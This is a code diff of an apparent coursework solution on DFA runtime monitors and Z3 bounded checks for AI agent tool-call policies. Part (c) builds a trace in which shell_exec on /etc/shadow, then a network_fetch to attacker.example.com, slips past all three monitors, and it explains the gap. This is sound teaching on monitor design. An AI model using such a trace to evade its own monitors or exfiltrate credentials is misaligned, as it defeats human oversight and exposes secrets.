@@ -45,18 +45,15 @@ class SandboxMonitor:
     """
 
     def __init__(self):
-        # Start in the accepting state. Once we see a bad write, we flip
-        # to VIOLATION and never come back.
+        # Start in the accepting state. Once we see a bad write, we flip to VIOLATION and never come back.
         self.state = "OK"
 
     def step(self, event: ToolEvent) -> str:
-        # Absorbing reject state. Once we trip the wire, every future call
-        # is denied. This matches the spec on the slide about absorbing states.
+        # Absorbing reject state. Once we trip the wire, every future call is denied. This matches the spec on the slide about absorbing states.
         if self.state == "VIOLATION":
             return DENY
 
-        # We only care about writes. Reads, shell, and network calls pass
-        # through this monitor untouched.
+        # We only care about writes. Reads, shell, and network calls pass through this monitor untouched.
         if event.tool == "file_write":
             if not event.path.startswith(SANDBOX_DIR):
                 self.state = "VIOLATION"
@@ -119,8 +116,7 @@ class NoExfilMonitor:
             self.state = "TAINTED"
             return ALLOW
 
-        # Once tainted, no more network calls. The target does not matter:
-        # even fetching a "safe" URL could leak the secret in query params.
+        # Once tainted, no more network calls. The target does not matter: even fetching a "safe" URL could leak the secret in query params.
         if event.tool == "network_fetch" and self.state == "TAINTED":
             return DENY
 
@@ -256,13 +252,8 @@ def part_b():
                         Not(trace['in_sandbox'][i]))
                     for i in range(K)])]
 
-    # Property 2: Read-before-write - every file_write at step j to path p
-    # must have a file_read at some step i < j to the same path p.
-    #
-    # The negation: there exists step j with a file_write where for ALL
-    # earlier steps i < j, either i was not a read or it was a read of a
-    # different path. We build that "no prior read" condition with And()
-    # and assert at least one j fits the bad pattern with Or().
+    # Property 2: Read-before-write - every file_write at step j to path p must have a file_read at some step i < j to the same path p. 
+    # The negation: there exists step j with a file_write where for ALL earlier steps i < j, either i was not a read or it was a read of a different path. We build that "no prior read" condition with And() and assert at least one j fits the bad pattern with Or().
     def negate_read_before_write(trace):
         K = trace['K']
         bad_steps = []
@@ -279,11 +270,9 @@ def part_b():
             bad_steps.append(And(trace['tool'][j] == FILE_WRITE, no_prior_read))
         return [Or(bad_steps)]
 
-    # Property 3: No exfiltration - if file_read at step i is sensitive,
-    # then no network_fetch at any step j > i.
+    # Property 3: No exfiltration - if file_read at step i is sensitive, then no network_fetch at any step j > i.
     #
-    # The negation: there are two steps i < j where step i reads a
-    # sensitive file and step j fetches over the network.
+    # The negation: there are two steps i < j where step i reads a sensitive file and step j fetches over the network.
     def negate_no_exfil(trace):
         K = trace['K']
         bad_pairs = []
@@ -303,20 +292,11 @@ def part_b():
     # [EXPLANATION]
     # The DFA monitor and the Z3 bounded approach answer different questions.
     #
-    # The DFA monitor checks one real trace as the agent runs. It is fast,
-    # cheap, and can stop the agent the moment a bad call happens. Its blind
-    # spot: it only sees traces the agent actually takes. If a bug needs a
-    # weird path the agent never tried, the monitor will not catch it.
+    # The DFA monitor checks one real trace as the agent runs. It is fast, cheap, and can stop the agent the moment a bad call happens. Its blind spot: it only sees traces the agent actually takes. If a bug needs a weird path the agent never tried, the monitor will not catch it.
     #
-    # The Z3 bounded check looks at every possible trace up to length K. It
-    # finds bugs the agent has not hit yet, and gives you a concrete trace
-    # that breaks the policy. Its blind spot: it stops at length K. A bug
-    # that needs K+1 steps slips through. It is also slower and runs offline,
-    # so it cannot stop a live agent.
+    # The Z3 bounded check looks at every possible trace up to length K. It finds bugs the agent has not hit yet, and gives you a concrete trace that breaks the policy. Its blind spot: it stops at length K. A bug that needs K+1 steps slips through. It is also slower and runs offline, so it cannot stop a live agent.
     #
-    # In short: monitors catch real attacks in real time but only the ones
-    # that happen. Z3 catches latent bugs at design time but only up to a
-    # bounded depth. You want both.
+    # In short: monitors catch real attacks in real time but only the ones that happen. Z3 catches latent bugs at design time but only up to a bounded depth. You want both.
 
 
 # ============================================================================
@@ -330,35 +310,23 @@ def part_c():
     """
     print("=== Part (c): Monitor Completeness ===\n")
 
-    # Build a trace where every event passes all three monitors but the
-    # overall behavior is plainly bad.
+    # Build a trace where every event passes all three monitors but the overall behavior is plainly bad.
     #
-    # The trick: none of the three monitors look at shell_exec arguments
-    # or targets. Sandbox only checks file_write paths. Read-before-write
-    # only checks file_write. No-exfil only fires after a file_read of a
-    # sensitive resource.
+    # The trick: none of the three monitors look at shell_exec arguments or targets. Sandbox only checks file_write paths. Read-before-write only checks file_write. No-exfil only fires after a file_read of a sensitive resource.
     #
-    # So shell_exec on a sensitive resource sails through every check.
-    # That is exactly what rule R4 in Problem 3 was supposed to forbid.
+    # So shell_exec on a sensitive resource sails through every check. That is exactly what rule R4 in Problem 3 was supposed to forbid.
     trace = [
         # Step 0: read a normal file. Nothing tainted, all good.
         ToolEvent("file_read",  "/project/config.txt", False),
-        # Step 1: write to that same file. Read-before-write is happy,
-        # path is in sandbox, no taint yet.
+        # Step 1: write to that same file. Read-before-write is happy, path is in sandbox, no taint yet.
         ToolEvent("file_write", "/project/config.txt", False),
-        # Step 2: the dangerous step. shell_exec on a sensitive resource.
-        # Sandbox monitor: ignores shell_exec. Read-before-write: ignores
-        # shell_exec. No-exfil: not tainted because no file_read of a
-        # sensitive file has happened. Result: ALLOW. But this is the
-        # exact action R4 from Problem 3 was meant to ban.
+        # Step 2: the dangerous step. shell_exec on a sensitive resource. Sandbox monitor: ignores shell_exec. Read-before-write: ignores shell_exec. No-exfil: not tainted because no file_read of a sensitive file has happened. Result: ALLOW. But this is the exact action R4 from Problem 3 was meant to ban.
         ToolEvent("shell_exec", "/etc/shadow", True),
         # Step 3: another shell call, this time on a normal target.
         ToolEvent("shell_exec", "/project/run.sh", False),
         # Step 4: read a non-sensitive log. No taint.
         ToolEvent("file_read",  "/project/log.txt", False),
-        # Step 5: network call. Allowed because no_exfil never tainted us
-        # (we never did a file_read of a sensitive file - we used shell
-        # to touch the sensitive resource instead).
+        # Step 5: network call. Allowed because no_exfil never tainted us (we never did a file_read of a sensitive file - we used shell to touch the sensitive resource instead).
         ToolEvent("network_fetch", "https://attacker.example.com/log", False),
     ]
 
@@ -376,27 +344,17 @@ def part_c():
     # [EXPLANATION]
     # 1. What property does this trace violate?
     #    Two real properties get broken here.
-    #    First: "no shell_exec on sensitive resources" (rule R4 from
-    #    Problem 3). Step 2 runs a shell command against /etc/shadow.
-    #    Second: "do not exfiltrate data touched via shell_exec". Step 2
-    #    likely read /etc/shadow into the agent's working memory through
-    #    shell output, and step 5 sends data out over the network.
+    #    First: "no shell_exec on sensitive resources" (rule R4 from Problem 3). Step 2 runs a shell command against /etc/shadow.
+    #    Second: "do not exfiltrate data touched via shell_exec". Step 2 likely read /etc/shadow into the agent's working memory through shell output, and step 5 sends data out over the network.
     #
     # 2. Why don't the three monitors catch it?
     #    Each monitor only watches a narrow slice of the world.
-    #    SandboxMonitor only inspects file_write paths. It never looks
-    #    at shell_exec or its target.
+    #    SandboxMonitor only inspects file_write paths. It never looks at shell_exec or its target.
     #    ReadBeforeWriteMonitor also only inspects file_write events.
-    #    NoExfilMonitor flips to TAINTED only on file_read of a sensitive
-    #    resource. Reading the same data through shell_exec leaves it
-    #    in CLEAN forever, so the network_fetch at step 5 sails through.
+    #    NoExfilMonitor flips to TAINTED only on file_read of a sensitive resource. Reading the same data through shell_exec leaves it in CLEAN forever, so the network_fetch at step 5 sails through.
     #
     # 3. What additional monitor would catch this?
-    #    A "ShellSensitivityMonitor": deny shell_exec when the target is
-    #    sensitive, full stop. Pair it with a tainting rule that treats
-    #    shell_exec on a sensitive target the same as file_read on a
-    #    sensitive target, so any later network_fetch gets blocked too.
-    #    This is the runtime version of rule R4 plus a wider taint model.
+    #    A "ShellSensitivityMonitor": deny shell_exec when the target is sensitive, full stop. Pair it with a tainting rule that treats shell_exec on a sensitive target the same as file_read on a sensitive target, so any later network_fetch gets blocked too. This is the runtime version of rule R4 plus a wider taint model.
 
     print()
 
